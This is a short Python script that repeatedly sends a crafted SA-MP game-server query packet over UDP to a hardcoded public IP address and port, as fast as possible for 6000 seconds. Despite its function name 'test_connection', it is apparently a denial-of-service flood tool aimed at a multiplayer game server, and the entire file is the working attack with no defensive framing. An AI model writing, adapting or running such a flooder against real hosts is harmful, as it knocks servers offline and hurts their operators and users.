import socket
import time

TARGET_IP = "89.46.1.130"
TARGET_PORT = 7008
DURATION = 6000

def test_connection():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        ip_bytes = bytes(map(int, TARGET_IP.split('.')))
        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
        
        payload = b'SAMP' + ip_bytes + port_bytes + b'i'
        
        end_time = time.time() + DURATION
        count = 0
        
        print(f"Sending packets to {TARGET_IP}:{TARGET_PORT}...")
        
        while time.time() < end_time:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
            
        print(f"Sent {count} packets successfully.")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    test_connection()
  
